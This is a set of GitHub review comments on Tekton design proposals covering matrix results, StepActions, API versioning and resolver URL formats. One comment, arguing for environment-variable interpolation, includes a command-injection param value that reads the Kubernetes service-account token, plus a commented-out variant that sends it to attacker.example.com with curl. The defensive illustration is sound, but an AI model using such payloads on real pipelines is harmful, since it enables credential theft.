There is an additional use case which we discussed this [morning](https://docs.google.com/document/d/16xMubfXC01So-aduTebF8cmyWRcsGYmnHl0EtiIohOY/edit#heading=h.naaqebdi68er) of running the same `scan` task for a given GitHub repo and retrieving only a scan report from the instance which ran scan with `X` to continue execution. The rest of the results might be consumed by the rest of the tasks in a pipeline.

None of these use cases are coming from a single vendor.

> Would matrix include be better suited to these use cases?

Matrix include is designed to specify a combination of `params` for a given `task`. This particular sample pipeline if we re-write using `include`, it will result in a very complex and verbose definition. We will have to spell out all possible combinations of params which were expected to be generated by the controller. And in turn, it defeats the purpose of introducing `matrix`. Include is a very useful feature for the use cases documented in the [TEP](https://github.com/tektoncd/community/blob/main/teps/0118-matrix-with-explicit-combinations-of-parameters.md).

> The syntax here would only work if the param names are static right? 

The syntax here is ideal when the param values are static. Its inherent nature of the `params` which allows `pipeline` and `task` definitions to provide `static` values. We are taking advantage of such static values in our own [CI](https://github.com/tektoncd/pipeline/blob/main/tekton/release-pipeline.yaml).

> If we added a new parameter e.g. `android` to the list then the task would produce unexpected results?

The pipeline author when updates the static value of a `param`, he/she is generally aware of its dependent tasks which are consuming the results. The task would not produce any unexpected results, the pipeline author will have to re-map the indices to match with her/his expectation.

Indexing into an array param/results is not something new being introduced by this TEP. Indexing into an array results is already a beta feature - https://github.com/tektoncd/pipeline/blob/main/docs/pipelines.md#passing-one-tasks-results-into-the-parameters-or-when-expressions-of-another

All the concerns we have here also applies to the pipeline which consumes array results by indexing into an array result or to the pipeline which consumes array params by indexing into the param from a `pipelineRun` (**without matrix**).

This [example](https://github.com/tektoncd/pipeline/blob/main/examples/v1/pipelineruns/beta/pipelinerun-param-array-indexing.yaml) will result in the same failure or will question the underlying task definition if the order of `environments` changes from `[ 'staging', 'qa', 'prod']` to `[ 'qa', 'prod', 'staging' ]` in the `pipelineRun`.

I would like to continue addressing the rest of the comments if we all align on the use case and reach a consensus on this feature request such that @EmmaMunley can focus on updating the TEP if needed.

@lbernick @dibyom @vdemeester @afrittoli thoughts?

Does your configuration repo also contain a Dockerfile that should be built in parallel with the source repo? It seems more likely to me that a configuration repo would contain e.g. infrastructure as code and not a binary that should be built in parallel in the same way as the source repo.

The rest of the results might be consumed by the rest of the tasks in a pipeline.

Can you elaborate a bit more on why the rest of the pipeline is gated on only one of the scan tasks in this use case? @EmmaMunley it would be helpful to add this use case to the TEP proposal. This particular sample pipeline if we re-write using `include`, it will result in a very complex and verbose definition. > Indexing into an array param/results is not something new being introduced by this TEP... Thanks very much @pritidesai! I would love to see the use cases you've identified here added to the TEP, with any related user feedback if we have it. It sounds like the main goal they have in common is to be able to use a result that was generated with a particular set of parameters; this goal would be helpful to have in the TEP as well, and then we can explore different solutions for achieving this goal.

Thanks Vincent for this question, I think it's interesting/important! There are actually a few related questions here IMO:
1. If a matrixed taskrun fails before writing a result, will the array result not exist or be length n - 1 or n (i.e. we provide some "zero value" for the result of a taskrun that doesn't produce a result that should) where n is the number of combinations? I think this is what Vincent was asking. IMO it should be length n - 1, and then once tep 50 is implemented, pipeline authors can choose whether to continue operating on the incomplete result even though the pipeline task is failed.
2. If a matrixed taskrun fails after writing a result, will the array result exist? I think https://github.com/tektoncd/pipeline/pull/6510 allows a taskrun to produce a result even if it failed after writing it, so it seems reasonable to me to have an array result populated for a matrixed pipeline task for consistency.
3. If a matrixed taskrun is supposed to produce a result, but doesn't, and still succeeds, should the array result not exist or be length n - 1 or n? Reading through TEP 48 I'm not sure exactly what the right call is here but I'd say an incomplete array result makes sense for consistency; the pipeline task will succeed so it wouldn't make sense to have it not produce a result.

In general I don't think it would be a good idea to produce "zero value" results for tasks that don't write the results to ensure the array result is the length of the number of combinations. (Note that this is another reason indexing might be a confusing UX: we'd have to either produce results for tasks that don't write them, or not produce an array result any time a task didn't write a result, even if the task succeeded.)

comments.author: wlynch
comments.body:
I agree with the general idea that we have two types of users that need different capabilities, but I think part of the problem here is "system provided" can be a grey area - e.g. a triggering system that's providing automation will look like another user w.r.t. the pipelines API, even though to external users it might be considered a trusted part of the overall CI system.

Was chatting w/ @lbernick about this this morning - I think it would make sense to try and model this in RBAC and have a separate verb for these kinds of "elevated" permissions - this would let us be agnostic to what is considered "system provided", and rely on permissions and the capabilities they provide. e.g. users with `create` permissions may be able to create Runs as they can today, but you can only include a `context` if you also have the `create-context` permission (or w/e we want to call it).

Related to this, I think it would be very useful to capture the user who create a Run, since we don't have a good way to determine if a Run created by an automation/system user or not without involving the k8s Audit API. Created https://github.com/tektoncd/pipeline/issues/7068 to track this separately.

comments.author: chitrangpatel
comments.body:
Yes and no. 

For an inlined-step this is not needed at all since inside the Task, we cannot really pass complete objects. Users need to declare explicit keys of the object they want to use. 

e.g. This is allowed (but it is a stringReplacement since we are replacing a single value, not the complete object.)
```
script: |
  echo $(params.objectparam.key)
```

but this is not:
```
script: |
  echo $(params.objectparam[*])
```
For this reason, we never passed object params for replacements inside a Task.

However now, with `StepActions`, a `Step` will need to pass it object param completely. 
For example, this is allowed:
```
steps:
  - ref:
      name: step-action
  params:
    - name: object-param
       value: $(params.objectparam[*])
```
Therefore, we now need to allow passing of objectParams into a Task. 
If you look at the [usage](https://github.com/tektoncd/pipeline/pull/7332/files#diff-487eb42be2c62df773ee4e76e5570d045aeac1ac0c7d56e095ebf14a7deac58bR374-R376), we only limit it to the use for `params` in `Steps`, and nowhere else so that the existing behaviour for inlined step remains intact.

comments.author: chitrangpatel
comments.body:
```suggestion
You can define `VolumeMounts` in `StepAction`, note that the `name` of the `VolumeMount` MUST be a **single param reference** to a string param ( for example, `$(params.registryConfig)` is valid but `$(params.registryConfig)-foo` or `"unparametrized-name"` is invalid).
```

comments.author: jerop
comments.body: must the name be a parameter? can it not just be a string?

comments.author: chitrangpatel
comments.body:
Yes, we explain it in the [TEP](https://github.com/tektoncd/community/blob/main/teps/0142-enable-step-reusability.md#volumemounts). The name must be a parameter so that the Task using this step action with other steps can provide a volume device with a name they choose.

Otherwise the following can happen:

1. Lets say StepAction1 names a volumeMount `foo`
2. StepAction2 names it `bar`

From the Task perspective, it should be the same volumeDevice/workspace that binds to the mount. The Task is forced to provide two separate volume devices for `foo` and `bar` which might lead to issues. 

Parametrizing it allows the Task author to provide the name and take control of the VolumeDevice/Workspace that will bind to this mount.

comments.author: wlynch
comments.body:
Following up from a Slack conversation: This was originally done under the expectation that we were going to bubble up step level results to the Task level. However

1. I don't think we should do this - I think we should make Task result exporting explicit so we're not overwhelming Task results with step-specific results without their context. e.g. if you have a git action that produces `url` and an oci action that produces `repo-url`, we shouldn't automatically bubble these up since it's going to be very difficult to understand the meaning of the results without additional details even though there's no naming collision (similar issues arise with other similar names - `sha`/`digest`, `url`/`uri`, `outcome`/`result`/`value`). @chitrangpatel is planning to follow up on this at the next WG.
2. Even if we do want to bubble these values up to the Task level, this decision should probably be made by the controller, not the entrypoint. There's still value in separating these out for the entrypoint so we can have a clear API to know what values were set where.

comments.author: pritidesai
comments.body:
```suggestion
The minimum reusable unit of work in Tekton, `Task`, currently cannot natively execute in isolation without relying on a shared file system. As such, Tekton users/authors have to compromise reusability for security, and performance. This design doc revisits the components and architecture of Tekton CRDs to both enable secure reusable objects and optimize performance. 
```

comments.author: pritidesai
comments.body:
```suggestion
`Tasks` are the reusable unit of work in Tekton. A `Task` is made up of a sequence of `Steps`. A `Task` and its `Steps` execute in Kubernetes as a `Pod` made up of a sequence of `Containers`. The `Steps` of a `Task` have access to ephemeral shared storage such as `emptyDir`. `Tasks` are combined in `Pipelines` which are graphs where each node represents a `Task`. The `Tasks` in a `Pipeline` execute in separate `Pods`, thus they need to share data via a `Workspace` that is generally backed by a `volume`.
```

comments.author: pritidesai
comments.body:
Running one huge `pod` with a series of containers running in sequence might not gain as much performance as expected.

For a common CI/CD use case, a simple application repo, git-clone can be the first step followed by building an image from that repo.

And a pipeline building many jar files as part of a single build process might be expensive and not feasible for a single pod.

comments.author: chitrangpatel

This statement is targeting simple use-cases where users are really forced to write a pipeline where it makes more sense to simply write a Task.

comments.author: chitrangpatel
comments.body:
Fixed. I updated the text. It is only needed when there are potential name conflicts. E.g. if two step actions produce results with the same name then the Task author can use this syntax to attach the result to another name at the Task level.

Say, step1 produces a result called `digest`.
`step2` also produces a result called `digest` and `url`

In this case, the task author needs to distinguish between step1's `digest` and step2's. There they can use:

```
results:
  - name: digest1
    value: $(step.step1.results.digest)
  - name: digest2
    value: $(step.step2.results.digest)
```

Failure to do so will cause both the results to be automatically surfaced to the Task where the second one i.e. Step2's result will overwrite Step1's.

The result `url` from `Step2` will be automatically surfaced to the Task level. But since there is no other step in the Task producing a result called `url`, the Task author does not need to resolve anything.

comments.author: afrittoli
comments.body:
If a tool does not allow specifying the path to a folder they need it could be argued that's an issue in the tool. That said, I agree that, as Tekton, we may need to help users cope with those cases. 
I don't think we should promote a syntax where the `Task` author needs to use `volume` instead of `workspace` because that brings a runtime value (the actual name of the volume) into the authoring-time space.

If a `StepAction` needs a volume to be mounted at a special place, it could expose a parameter that provides the name of the volume, so that the step may additionally mount that volume on a different path. 

```yaml
apiVersion: tekton.dev/v1alpha1
kind: StepAction
metadata:
  name: myStep
spec:
  params:
    - name: registryConfigVolume
      description: the name of the volume with the registry configuration
  volumeMounts:
    - name: $(params.registryConfigVolume)
      mountPath: /registry-config
  image: ...
  script: ...
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: task-name
spec:
  workspaces:
  - name: registry-config
  steps:
  - name: myStep
    ref:
       name:  myStep
     params:
     - name: registryConfigVolume
       value: $(workspaces.registry-config.volume)
```

In short, I'm ok with the `volumeMounts` field in steps as long as we don't suggest it be used together with `volume` in `Task`. Another possibility, for a more concise and specific syntax, could be:

```yaml
apiVersion: tekton.dev/v1alpha1
kind: StepAction
metadata:
  name: myStep
spec:
  volumeMounts:
    - name: registryConfig
      description: the name of the volume with the registry configuration
      mountPath: /registry-config
  image: ...
  script: ...
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: task-name
spec:
  workspaces:
  - name: registry-config
  steps:
  - name: myStep
    ref:
       name:  myStep
     volumeMounts:
     - name: registryConfig
       volume: $(workspaces.registry-config.volume)
```

Having 2 different ways to solve the same problems in the same API is, in my opinion, also not necessarily a good `UX`.
Looking back, we even moved from `inputs.params` to `params` while bumping API version (`v1alpha1` to `v1beta1`) even though we could have done breaking changes in `v1alpha1`. 

The proposal of adding this to `v1`, and in general to add *a lot* of new fields in `v1` seems like we don't treat `v1` as stable, or as complete enough to be considered as is. This is fine, but `v1` is there, and is there for a while, and is considered stable from our user's perspective. We have to be *very careful* when adding new fields to `v1`.

Any field we add to `v1` (even behind a feature-flag) are there to stay (they can't be removed). Any field we add to `v1` need to be documented (and would automatically be if we fix https://github.com/tektoncd/pipeline/issues/1461 (and https://github.com/tektoncd/pipeline/issues/3416 at the same time) — and for each "alpha" or experimental ones, we need to make it show as it in the doc, etc..

Other question arrives :  `kubectl` (and Kubernetes in general) is merging objects with `kubectl apply` for example. This lead to problems between `v1alpha1` and `v1beta1` as it was merging `inputs.params` with `params`. Having both on the same object would also be an issue — I created my object with `params`, I now want to try that new consice thing, I switch to `inputs.params` and I apply, it breaks. But because it's on `v1`, this issue could never be fixed for the `v1` API as we *cannot remove fields* — we would be stuck with this issue until `v2` (the stable one) and `v1` gone and out of support (which would be.. in a really long time, years and years from now).

Having a `v2alpha1` or a feature-flag is similar in that they require the user to *do* something. But one is way more explicit in its "experimental" nature, as you are using `v2alphaX` API, so you know you shouldn't use it in production, you know it could break tomorrow.

> From the implementation perspective, if we add v2alpha1, we will need more efforts, e.g.:

For me, this is not a concern. The aim is end-user consumption, happyness, etc. If we need to do more effort to make a better user experience, I'll choose this over and over.

> - we need to consider conversion among v2alpha1, v1, v1beta1.
> - developers making api changes to v1 will update v2alpha1.

That's the thing about `v2alpha1`, it could be "incomplete" in way, as it's alpha, it's there for exploration.

Thanks! 
>  Having 2 different ways to solve the same problems in the same API is not a good UX.  

Yes I agree, even if it is gated by a feature flag, users may get confused.

> we need to be very careful to add new api into v1. 

Yes I agree. Trusted artifacts is proposing to add `inputs.artifacts` and `outputs.artifacts`, so for tep-0143 we just need to add params and results to them. 

> Having both on the same object would also be an issue ...

I think this can be avoided by how we implement this? My current PoC is using mutation webhook to populate current `params` with the `inputs.params`, and we don't need to change the reconciler code. So if there is existing pipelinerun with `params`, the new object would just have both `inputs.params` and `params`and won't break. 

So I think "having 2 different ways of defining the same thing in api" is a valid reason that we should not add it to v1

comments.author: afrittoli
comments.body:
@khrm @Yongxuanzhang I'm not 100% I got it right, this is my understanding of the issue.
Current `TaskRun` spec:

```
spec:
  params:
  - name: example
    value: foo
  serviceAccountName: default
```

New `TaskRun` spec:

```
spec:
  input:
    params:
      example: foo
  serviceAccountName: default
```

With the new spec, if `serviceAccountName` was not indented properly,  you could have:

```
spec:
  input:
    params:
      example: foo
      serviceAccountName: default
```

Which would not fail validation if the `Task` in question had a parameter called `serviceAccountName`.
This could not happen with the current API. This could be prevented in the new syntax by forbidding `serviceAccountName` as a parameter name.

comments.author: QuanZhang-William
comments.body:
Not really. There are 2 kinds of check we do
- Validate user input against enums. At pipeline level, we will validate `message1` and `message2` individually; at task-level, we validate the value of `message` is in it own enum (the compound value). This PR does not change this behavior.
- Subset validation: prior to the change, we require that the pipeline-level param enum must be a subset of the task-level enum referencing it. If a task-level `param` referenes a single pipeline-level `param`, it is easy and we still validate it. However, if it references multiple pipeline-level params, like this one,  we will skip the subset validation.

comments.author: aaron-prindle
comments.body:
Np, I should clarify this a bit - added a link to `eval` man page in the doc.  This statement referencing calling `eval` is referring to the idea that it is possible that users actually want to be able to interpret the param value string as code (vs a string) and in such cases they can explicity use `eval` instead of relying on the fact that Tekton directly does string interpolation. 

More information around the `eval` command can be found here:
https://man7.org/linux/man-pages/man1/eval.1p.html

comments.author: aaron-prindle
comments.body:
I have added new sections w/ examples related to the security improvements and reliability improvements uses env vars has vs direct interpolation.  These have some specific examples

The gist is that program environment variables are designed in such a way to have additional security around code injection:
- https://mywiki.wooledge.org/BashProgramming/05#Environment_variables
- https://www.redhat.com/en/blog/bash-specially-crafted-environment-variables-code-injection-attack

comments.author: aaron-prindle
comments.body:
An example from the new section, if you have something like:

```
apiVersion: tekton.dev/v1beta1
kind: PipelineRun
metadata:
  name: echo-message-pipelinerun
spec:
  pipelineRef:
    name: echo-message-pipeline
  params:
    - name: message
      value: "$(echo $(cat /var/run/secrets/kubernetes.io/serviceaccount/token))"
      # value: "$(curl -s http://attacker.example.com/?value=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token))"
```

```
apiVersion: tekton.dev/v1beta1
kind: Task
metadata:
  name: echo-message-task
spec:
  params:
    - name: message
      type: string
      description: The message to echo
      default: "Hello, World!"
  steps:
    - name: echo
      image: ubuntu
      script: |
        #!/bin/bash
        echo "$(params.message)"
```

If you run this with tekton as it currently is, you will get an output like:
```
$ <the-token-at-/var/run/secrets/kubernetes.io/serviceaccount/token>
```

BUT if you run this and instead of doing direct string interpolation you use an env var, you won't run injected code.  For example, using my branch where I have implemented this solution, the example + log output below illustrate the difference:

```
kind: Task
metadata:
  name: echo-message-task
spec:
  params:
    - name: message
      type: string
      description: The message to echo
      default: "Hello, World!"
  steps:
    - name: echo
      image: ubuntu
      script: |
        #!/bin/bash
        echo "$(params.message)" # <-- current default method of controller interpolation
        echo "$$(params.message.env)" # <-- proposed method of env var PARAM_MESSAGE interpolation
 ```
 
`TaskRun` log output of attempted attack
 ```
 $ aprindle@aprindle-ssd ~/repro-params-scripts/string kubectl logs echo-message-pipelinerun-echo-message-pod 
Defaulted container "step-echo" out of: step-echo, prepare (init), place-scripts (init)
<the-token-at-/var/run/secrets/kubernetes.io/serviceaccount/token> # < -- BAD! (w/ old default)
$(echo $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)) # <-- GOOD! (w/ proposed soln)
 ```

    * This is a good point, to clarify could you elaborate on the specific brittleness you mention?  My interpretation would be that because param names are somewhat unconstrained multiple param names might map to the same env var name in translation if not careful.  I have not added this into the document but to reduce brittleness in the param-name- > env-var name translation we could add a param name hash suffix (similar to k8s pods) to avoid collisions eg: TEKTON_PARAM_FOO_X5GHA.  This would make directly knowing the name for the param a bit more difficult for users but Tekton is dynamically generating these anyway so it should be ok if it is somewhat opaque.
* what happens in case of conflicts with user-defined environment variables or how do we prevent such conflicts
    * Good point, this case important to call out explicitly.  I’ve added this into the document now under `Design Details` in a bulleted section titled - “Considered Edge Cases and Gotchas”.  The gist is that in case of an overlap with user-defined environment variables, Tekton will throw a validation error stating that the param should be renamed. NOTE: collision should be very unlikely given the TEKTON_PARAM prefix and we can also optionally add a sha suffix to the env var (based on the param name) to further unique-ify the env var name to reduce collision.
* how do we handle array params? We added support for indexing into array params but how do we render the list into an environment variable that is usable by different kinds of script environments? Shall we use a JSON blob? That's not too bash-friendly but very python-friendly
    * Currently the plan would be that the values in the env var map 1:1 with how they are currently used as that UX is working for users atm.  In the case of an array param, it would be the same values based on the syntax, for an array param + index (params.arr[0]) we would get the string value and for the entire array we would provide the list as a comma separated array (params.arr -> first,second,third…)  The TEP suggestion is built around the `script` field which only supports string type variables which currently has comma separated serialization for the array and actually has a validation error against using an object directly (vs an object field).  I have added some examples under the “Suggested Solution”.
* how do we handle object params? Do we add one variable for each field? Or a single variable with a JSON blob?
    * There would be a variable for each field.  I have added some examples under the “Suggested Solution”.  Currently in my experimentation around this it seems that you get a validation error if you try to reference a param object in a script directly (vs a param object field which works) - as such there doesn't seem to be a precedent for supporting the obj param directly as they can't be used IIUC in `script` currently

comments.author: wlynch
comments.body:
Tweaked some of the copy.

```suggestion
### Output Artifacts in SLSA Provenance

Artifacts are classified as either:

- Build Outputs - packages, images, etc. that are being published by the build.
- Build Byproducts - logs, caches, etc. that are incidental artifacts that are produced by the build.

By default, Tekton Chains will consider all output artifacts as `byProducts` when generating in the [SLSA provenance](https://slsa.dev/spec/v1.0/provenance). In order to treat an artifact as a [subject](https://slsa.dev/spec/v1.0/provenance#schema) of the build, you must set a boolean field `"buildOutput": true` for the output artifact.

e.g.  
```yaml
apiVersion: tekton.dev/v1
kind: TaskRun
metadata:
  generateName: step-artifacts-
spec:
  taskSpec:
    description: |
      A simple task that populates artifacts to TaskRun stepState
    steps:
      - name: artifacts-producer
        image: bash:latest
        script: |
          cat > $(artifacts.path) << EOF
          {
            "outputs":[
              {
                "name":"image",
                "buildOutput": true,
                "values":[
                  {
                    "uri":"pkg:oci/nginx:stable-alpine3.17-slim?repository_url=docker.io/library",
                    "digest":{
                      "sha256":"df85b9e3983fe2ce20ef76ad675ecf435cc99fc9350adc54fa230bae8c32ce48",
                      "sha1":"95588b8f34c31eb7d62c92aaa4e6506639b06ef2"
                    }
                  }
                ]
              }
            ]
          }
          EOF
```

This informs Tekton Chains your desire to handle the artifact.

> [!TIP] 
> When authoring a `StepAction` or a `Task`, you can parametrize this field to allow users to indicate their desire depending on what they are uploading - this can be useful for actions that may produce either a build output or a byproduct depending on the context!
```

comments.author: afrittoli
comments.body:
The display name here (and in the next ones) seems to be related to how a specific matrix combination was extended through the `matrix.include` section. Some are only extended with `common-package` so they all that name. the the `common-package` include did not exists, would they have an empty `displayName`?

As a side comment (not related to this PR specifically) I find that the way that `matrix.params` and `matrix.include` are merged is a bit complex. 
The `matrix.include` part can be used to add parameters to existing combinations and at the same time to add new combinations while using the same syntax. I read the guide at https://tekton.dev/docs/pipelines/matrix/#explicit-combinations but I still find it hard to digest. It can be quite powerful but I find the syntax confusing. 

In this test, there is an initial 3x2 matrix:
- amd64, go1.17
- ppc64, go1.17
- s390x, go1.17
- amd64, go1.18
- ppc64, go1.18
- s390x, go1.18

plus 4 included combinations:
- common-package:
  - This one is added to each of the previous six. I thought that this is what `params` was for, to specify parameters that get the same value rather than adding a combination to the matrix. Why is this added to each combination and does not generate a new combination? What would happen if `params` was used to set `common-package` as well? Would this become a separate combination in the matrix?
- s390x, flags (no-race)
  - This is added to all the s390x combinations in the original matrix, which get the no-race. So the first parameter is used as a kind of filter, and what this says is "for each combination in the original matrix that has s390x, add the no-race flags". Note that at the same time, it also says "for each combination in the original matrix that has "no-race flags, add the s390x arch", which was probably not the intention. So, values in the include can act both as filters as well as values to be added, which I did not expect at all. 
- go1.17, context
  - This is similar to the above, each go1.17 gets context, and each context would get go.1.17 if it was there
- non-exist-arc
  - This is added as an extra combination, which is the "normal" behaviour I expect for `include`

I would find the following syntax much easier to understand:

```yaml
      displayName: Common package, go $(params.version), arch $(params.GOARCH)
      params:
        - name: package
          value: path/to/common/package/
        - name: flags
          value: '-cover -v'
          when:
            - GOARCH==linux/s390x
        - name: context
           value: path/to/go117/context
          when:
            - version==go1.17
      matrix:
          params:
          - name: GOARCH
            value:
              - linux/amd64
              - linux/ppc64le
              - linux/s390x
          - name: version
            value:
              - go1.17
              - go1.18.1
        include:
         - name: non-existent-arch
           params:
            - name: GOARCH
              value: I-do-not-exist
```

I think its a question of introducing a new way of referencing `params` i.e. `matrix.params.<param>` v/s introducing a new field. I am open to reusing the existing field `spec.tasks[].displayName` instead of introducing a new field. But wondering is it possible?

kind: Pipeline

    - name: git-repo

kind: Pipeline
spec:

comments.author: wlynch
comments.body:
I don't think purls are the right fit here. I think it's great to draw inspiration from them, but they're a bit rigid in how they are being proposed to be used, and are different than how most users would expect a resource locator to be used. purls are not a very human friendly format, and I think asking users to format a purl is going to cause a lot of friction.

I'd rather lean in a more URL-like format here and let resolvers figure out how to parse them:

```
<scheme>://<location>[@<version>][#<selector>][?<params>]
```

e.g. pulling examples from the original issue:

- `git://github.com/wlynch/test@main#task.yaml`
- `oci://wlynch/image:v1@sha256:...#task/foo`
- `https://example.com/task.yaml`

comments.author: chitrangpatel
comments.body:
I'll let @wlynch comment but the idea here was that different resolvers subscribe to schemes (e.g. https, git+https, etc.). The Tekton pipelinerun/taskrun controller parses the scheme and then forwards the request to the resolvers that have subscribed to this scheme one at a time based on some form of priority. 

e.g. a `url` of `https://github.com/tektoncd/pipeline` would first be tried by the git-resolver and if that fails, we would send it to the http resolver because both those resolvers have subscribed to the `https` scheme.

Because something like this involves significant change in the existing architecture, we scoped it out of this TEP into future work. 

So today, the request for:
```
taskRef:
  resolver: git
  url: https://github.com/tektoncd/pipeline
```
Would go explicitly to the git resolver. Once we have this future work, the `resolver: git` would be optional and Tekton would try forwarding the requests.

comments.author: chitrangpatel
comments.body:
To me `github://`, `git+https://`, `https` are different schemes, not resolvers. I don't think a single resolver has to only be able to handle one scheme. For example, the git resolver could handle:
* https
* git+https
* git+ssh

If an unsupported scheme is passed to the resolver, it can throw an error. How the url is used is also decided by the resolver.
The resolver could choose to use the url as is to handle the resolution request or it could choose to parse and extract the necessary information to construct a different url altogether when performing the resolution. This will partly be dictated by the libraries that the underlying resolver uses. 

Effectively, we want to pass it a string value. We are saying that the best practice is to format that string uniformly using the prescribed template. But how that value is used is determined by the resolver.

comments.author: chitrangpatel
comments.body:
It is completely ok for the resolver to be able to parse multiple formats and validate based on the `scheme`. That's why the `scheme` is a required field. Everything else is optional and subject to more details as the resolvers see fit:

e.g. 
if scheme == `https`, 
Then it must look like
```
https://<complete-git-repo>@<version/sha>#<sub path>

e.g.

https://github.com/tektoncd/pipeline@XXXXX#a/b/c
```

But if scheme == `scmType`
It must look like:
```
<scmType>://<org>/<repo>@<version>#<sub path>?<tokens etc.>

e.g.
github://tektoncd/pipeline@sha1:nsjdhjshjdh#examples/v1/taskruns/hello.yaml
```

The user can provide either format they choose. And as long as the resolver can parse the string, it's all good.
It is not expected that the resolver needs to allow all possible permutations. That's why we also have `params`. If the resolver cannot understand all permutations, it can consume inputs via resolver params and users will always have that option. If users make a mistake while providing the string, the resolver can throw a validation error.

However, I wanted to convince you that the current TEP will get us half way there towards the subscription based approach. 

 The format of the `name/url` (whatever we call it) starts with a scheme.

```yaml

   name: "https://github.com/tektoncd/pipeline@main#examples/v1/taskrun/hello.yaml"
   resolver: git # in the future this is optional.
```

I discuss this in the next section but my idea here was that since the value of the keys is a comma-separated list of resolver names, the order is high to low. So the cluster operators can choose the order of priority based on each scheme.

e.g. say we have a cluster with three resolvers: `resolver-a, resolver-b, resolver-c` and across the resolvers, the supported schemes are: `http, https, oci, git+https`. The config would look like:

```yaml
data:
  https: resolver-a, resolver-b
  http: resolver-b,resolver-a
  oci: resolver-c
  git+https: resolver-a
```

Based on above, config, for the scheme `https`, the cluster operator has decided to provide a higher priority to `resolver-a` over `resolver-b` resolver and vice-versa for the scheme `http`.

```yaml
